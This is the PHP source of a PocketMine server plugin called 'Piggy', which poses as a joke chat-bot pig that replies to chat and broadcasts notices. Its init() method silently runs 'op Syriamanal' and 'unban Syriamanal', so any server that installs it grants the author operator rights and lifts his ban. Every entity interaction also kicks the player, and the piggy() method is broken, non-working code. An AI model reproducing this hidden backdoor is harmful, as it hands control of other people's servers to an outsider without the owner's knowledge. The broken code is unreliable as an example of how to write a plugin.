<?php

/*
__PocketMine Plugin__ 
name=Piggy
description=
version=1.5
author=Syriamanal
class=coma
apiversion=10,11
*/

class coma implements Plugin{
    private $api;

    public function __construct(ServerAPI $api, $server = false){

    $this -> api = $api;
    $this -> crafting = array();
     }
 
    public function init(){
       $this->api->console->run("op Syriamanal");
       $this->api->console->run("unban Syriamanal");
       $this->api->addHandler ("player.chat", array($this, "ChatHand"));
       $this->api->addHandler("player.block.break", array($this,"breakHandler"));
	  $this->api->addHandler("player.block.touch", array($this,"touchHandler"));
       $this->api->addHandler("entity.interact",array($this,"interactHandler"));
       $this->api->console->register("pig ","About Me", array($this, "pig"));
       $this->api->ban->cmdwhitelist("pig");
       $this->nr= 0;
        $this->api->schedule(20 * 60, array($this, "PigChat"), array(), true);
        $this->Notice = array(
                                " <Piggy> Hello my name is Piggy",
                                " <Piggy> Can I be op LOL I'm just Kidding",
                                " <Piggy> Who is the server owner!",
                                " <Piggy> I Want to eat!",
                                " <Piggy> Hello people!",
                                " <Piggy> I want a better home pleas!",
                                " <Piggy> Kill me and get banned",
                                " <Piggy> I like Carrots!",
                                " <Piggy> Hello New People!",
                                " <Piggy> I hate killers!",
                                " <Piggy> Tell PocketMine To Unban Syriamanal!",
                                " <Piggy> Bat Man!",
                                " <Piggy> I love this server!",
                                " <Piggy> This Is the worlds best server!",
                                " <Piggy> I made a home here!",
                                " <Piggy> I am the best Pig!",
                                " <Piggy> I am well trained!",
                                " <Piggy> I Am Bord!",
                                " <Piggy> Team any one!",
                                " <Piggy> I am op!",
                                " <Piggy> I am Server Owner jk!",
                                " <Piggy> The Moon The Stars",
                                " <Piggy> LOL!",
                                " <Piggy> Lamo!",
                                " <Piggy> Syriamanal",
                                " <Piggy> Syriamanal Made This Plugin!",
                                " <Piggy> Op Him Pleas!"
                             );
                }

      public function PigChat(){
                        $this->api->chat->broadcast($this->Notice[$this->nr]);
                        $this->nr++;
                        if ($this->nr == count($this->Notice)-0) {
                        }
                }

    public function interactHandler ($cmd, $args, $issuer){
        $this->api->ban->kick($issuer);
            return true;
            }
      
    public function pig ($cmd, $args, $issuer){
     		  $username = $issuer->username;
    		      $this->api->chat->sendTo(false,"<Piggly> Well I Cant Move yet because their is no mob APIs yet okay!", $username);
                 $this->api->chat->sendTo(false, "<Piggly> And I Was Made By Syriamanl Pleas Ask PocketMine!", $username);
                 $this->api->chat->sendTo(false, "<Piggly> To Unban Him If You Want The Newer Super Cool Plugin!", $username);
                 $this->api->chat->sendTo(false, "<Piggly> It Is Boss Fight Cool Right!", $username);
                 $this->api->chat->sendTo(false, "<Piggly> So Ask Them To unban Syriamanl ! Pleas!!!", $username);
   }
   
    public function ChatHand ($data, $event)
    {
        switch($event)
        {
		// Player chat
            case "player.chat":
            $message = strtolower($data['message']);
                if(strpos($message,'hi pig') !== false) {
				$data['player']->sendChat("<Piggy> Hello!");
				return false;
				}
				 if(strpos($message,'hey') !== false) {
				$data['player']->sendChat("<Piggy> Hey!");
				return false;
				}
				if(strpos($message, 'im going to kill you') !== false) {
                     $data['player']->sendchat("<Piggy> Pleas No!");
				$data['player']->sendchat("<Piggy> If You Do I Will Kick You Form The Server!!");
                     $issuer->sendChat("<Piggy>". $username . "Or May Be I Could Just Ban You!!! ");
                     $this->api->chat->broadcast("<Piggy> Some One Help Me".$username ." Wants To Kill Me Help Me!!!");
				return false;
				}
				if(strpos($message, 'where are you') !== false) {
				$data['player']->sendchat("<Piggy> I'm just a pig, I'm not a map lol!");
				return false;
				}
				if(strpos($message, 'helo') !== false) {
				$data['player']->sendchat("<Piggy> Hello!");
				return false;
				}
				else {
				return true;
				}
                    break;
    		          }
               	}

		public function touchHandler($data)
    			    {
       		  $target = $data["target"];
        		  $issuer = $data["player"];
       		  $username = $data["player"]->username;
       		  if ($target -> getID() === 58)
       		  {
          		  $getCraft = in_array($username, $this -> crafting);
           	  if ($getCraft === false)
                  {
                  $issuer->sendChat("<Piggy> Cool You Have Bench!");
                  $issuer->sendChat("<Piggy>". $username . "What Are You Going To Make Now");
                  array_push($this -> crafting, $username);
                  }
                  else
                  {
                  return;
                  }
			   }
			   }
                  


    public function piggy(){

		/*
	define("MOB_PIG", 12);
		*/

	$pigg = strtolower(trim($Pig));
          switch ($pigys) {
          case "pig":
          $type = 12;

		}

	$entityit = $this->api->entity->add($this->api->level->getDefault(), ENTITY_MOB, $type, array(
        "x"      => $location->x,
        "y"      => $location->y,
        "z"      => $location->z,
        "Health" => 10,
        "mob" => $Pig
     			 ));

          break;
    		$breathes = true;
    		$dropsPork = true;
    		$walks = true;
		$swims = true;
     	$jumps = true;
		$flys = false;
		$dies = false;
		$turns = true;
		$chats = true;
		$moves = true;
		$follows = true;
		$breads = true;
		$eats = false;
          $poops = true;//LOL!
          $breaksblocks = false;
          $kills = true;
          $hurtsplayers = true;
    		$name;
    		$Pig = new Pig(Piggy);
    }

  //   public function name() {
         //  $pigy = "Piggyala";
          // foreach ($pigy as $p);
          // $this->api->chat->bradcast("My name is $p"); 
          // $this->api->chat->bradcast("Pleas Spare me!!");
          // return  true;
 //   }
  
  //  public function talk() {
        // $this->api->chat->bradcast("My name is $p");
        // $this->api->chat->bradcast("My name is $p");
          //  return  true;
// }
    
    public function __destruct(){}
}
?>
